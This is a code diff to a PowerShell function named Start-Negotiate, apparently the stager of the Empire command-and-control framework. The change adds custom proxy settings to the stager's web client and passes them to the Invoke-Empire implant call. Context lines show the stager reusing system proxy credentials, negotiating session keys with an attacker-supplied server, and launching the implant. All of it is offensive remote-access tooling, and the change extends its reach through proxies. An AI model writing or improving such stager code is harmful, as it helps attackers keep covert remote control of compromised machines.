@@ -101,6 +101,12 @@ function Start-Negotiate {
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
+
+    if ($Script:Proxy) {
+        $wc.Proxy = $Script:Proxy;   
+    }
+
+    
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
         $headers = $customHeaders -split ',';
@@ -210,7 +216,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE";
+    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
